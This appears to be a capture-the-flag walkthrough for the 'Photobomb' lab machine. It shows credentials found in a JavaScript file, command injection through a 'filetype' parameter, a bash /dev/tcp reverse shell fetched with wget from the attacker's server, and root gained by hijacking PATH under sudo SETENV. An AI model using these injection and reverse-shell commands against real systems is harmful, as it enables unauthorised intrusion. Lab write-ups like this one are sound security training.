**Target: 10.10.11.182 Photobomb**

**Initial Access:**\
nmap 10.10.11.182 -Pn --min-rate=5000 -p-\
output shows ports open: 22,80\
Enumerating those ports further:
![image](https://user-images.githubusercontent.com/93153300/198094317-0f16d654-f4d6-4cb6-8c48-91f5e4a5db94.png)
 
nmap shows that 10.10.11.182 tries to rediret to photobomb.htb.  So to make that redirect work add to file /etc/hosts:  10.10.11.182    photobomb.htb 						

Navigate to port 80 site  http://photobomb.htb  → Not much on the site.  	\	
Site has a ‘click here’ url		 → clicking on it leads to a login page on directory /printer.  	
We don’t have credentials, and trying some default credentials doesn’t work.  \
Directory brute forcing and wfuzz for subdomains doesn’t lead to anything of interest.  			

Viewing the source code on http://photobomb.htb shows:
![image](https://user-images.githubusercontent.com/93153300/198094435-390e3910-c178-4e45-b5fe-45666d164ca9.png)
 
Navigating to the directory it mentions, http://photobomb.htb/photobomb.js shows:		
![image](https://user-images.githubusercontent.com/93153300/198094493-c991b408-7b35-4d65-9d24-a04f37a68e88.png)
 
This gives credentials: username:pH0t0   password:b0Mb!			

Navigate to http://photobomb.htb/printer login page and enter the credentials, we are now logged in. The page shows pictures and a download photo to print:  	
![image](https://user-images.githubusercontent.com/93153300/198094673-58ae5451-0fac-457e-8d4e-cf56d30abd74.png)



Capturing the ‘Download photo to print’ request in burp suite shows:
![image](https://user-images.githubusercontent.com/93153300/198094722-6be55024-f70c-405f-923d-664d0cf8dcbe.png)

Fuzz the 3 parameters shown: photo, filetype, and dimensions. Let’s first fuzz for command injection.  The reason we will start with fuzzing for command injection is because http://photobomb.htb shows:
![image](https://user-images.githubusercontent.com/93153300/198095178-4536aedf-d496-4975-9782-ef9b6de7fb3e.png)

 
It seems to indicate possible command injection when it states “Your wish is its command”.  

Proof of concept  for command injection found:	\				
The command injection is on the ‘filetype’ parameter.   Add after ‘filetype=jpg’ a semicolon and then whatever command you want to run, like so: filetype=jpg;ping 10.10.14.50 -c 4			

To capture the ping request run in terminal: tcpdump -i tun0 icmp	\		
In the burp suite capture, make sure to url encode the command.  The parameters with our modification will look like this:	\				
photo=eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&filetype=jpg;ping+10.10.14.50+-c+4&dimensions=30x20

Send the request in burp suite and we get back ping requests in tcpdump.  

Let’s use this to upload a file and then run it to get a reverse shell.\
First, open a netcat listener: nc -lvnp 443\
Next, create the file: 	echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.50/443 0>&1'" > test.sh\
Then, open a python server to host the file test.sh: python3 -m http.server 80\
In burp suite, change the ping command to wget http://10.10.14.50/test.sh and url encode it:
![image](https://user-images.githubusercontent.com/93153300/198095303-77178393-5469-470d-95e0-87ade3ffbbd6.png)

 
Now that it’s uploaded, give test.sh on the target execuable permissions.  Do this in burp suite, change the wget command to chmod +x test.sh and url encode it:
![image](https://user-images.githubusercontent.com/93153300/198095342-d6bdae76-9af1-4768-bafa-2384a63f944c.png)
 
Finally, run test.sh from the target to get a reverse shell on our netcat listener.  In burp suite, change the chmod command to ./test.sh:
![image](https://user-images.githubusercontent.com/93153300/198095402-a1427dbc-6173-4c8e-af20-c26efffe36f0.png)

We now have a shell as wizard, open /home/wizard/user.txt to get the flag. 
______________________________________________________________________
**Privilege Escalation:**\
sudo -l shows:
![image](https://user-images.githubusercontent.com/93153300/198095444-26dd6654-51c1-41ad-bab4-4dc2062fbb71.png)

  
SETENV can often be exploited.  SETENV means that when you run this sudo command, you have permission to also set the PATH it will use for this command.  If we can set the PATH, then we can use that to make the running file call a malicious file that we create, instead of the file it was supposed to use.  The last step that remains to see if we can use this SETENV to get root is to look over the file that will be run with sudo (/opt/cleanup.sh) and see if any file is called without using a complete path.  Opening /opt/cleanup.sh shows:  
![image](https://user-images.githubusercontent.com/93153300/198095465-e1f2bbe6-5b88-4e75-80fa-7c0681d47376.png)



The find command is not using a complete path, so let’s use SETENV to get root. 

Step 1: create a malicious file and give it the name find → echo -n “chmod 4755 /bin/bash” > /dev/shm/find.  				
Step 2: give /dev/shm/find executable permissions  →   chmod +x /dev/shm/find	\		
Step 3: run the sudo command and give it the path to the malicious find command   → sudo PATH=/dev/shm:$PATH /opt/cleanup.sh				
Step 4: /bin/bash -p\
We have shell as root
![image](https://user-images.githubusercontent.com/93153300/198095522-9af6c384-0af6-43d5-9532-4bad28584e8d.png)

